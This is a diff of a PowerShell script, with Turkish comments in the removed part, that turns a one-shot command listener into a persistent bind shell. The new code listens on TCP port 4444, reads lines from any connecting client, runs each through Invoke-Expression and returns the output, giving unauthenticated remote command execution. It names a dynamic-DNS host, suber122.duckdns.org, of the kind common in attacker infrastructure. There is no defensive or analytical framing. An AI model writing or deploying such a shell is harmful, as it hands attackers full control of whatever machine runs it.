@@ -1,34 +1,26 @@
-function GPT4-Listener {
-    [CmdletBinding()]
-    param(
-        [Parameter(Mandatory=$True)]
-        [int]$Port,
-        [Parameter(Mandatory=$False)]
-        [string]$IP = "suber122.duckdns.org"
-    )
+$port = 4444
+$ip = "suber122.duckdns.org"
 
-    # IP adresi ve portu bir araya getiriyoruz.
-    $endPoint = New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Parse($IP), $Port)
+$listener = [System.Net.Sockets.TcpListener] $port
+$listener.start()
 
-    # Listener'ı başlatıyoruz.
-    $listener = New-Object System.Net.Sockets.TcpListener($endPoint)
-    $listener.Start()
-    
-    # Bağlantı bekliyoruz.
-    Write-Host "Dinlemede..."
+while ($true)
+{
     $client = $listener.AcceptTcpClient()
     $stream = $client.GetStream()
-    
-    # Komutları işletiyoruz.
+
     $reader = New-Object System.IO.StreamReader($stream)
-    $command = $reader.ReadToEnd()
-    Write-Host "Komut: $command"
-    $output = Invoke-Expression $command
     $writer = New-Object System.IO.StreamWriter($stream)
-    $writer.Write($output)
-    $writer.Flush()
-    
-    # Bağlantıyı kapatıyoruz.
+
+    $writer.AutoFlush = $true
+
+    while ($stream.Connected)
+    {
+        $data = $reader.ReadLine()
+        if (!$data) { break }
+        $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String)
+        $writer.WriteLine($sendback)
+    }
+
     $client.Close()
-    $listener.Stop()
 }
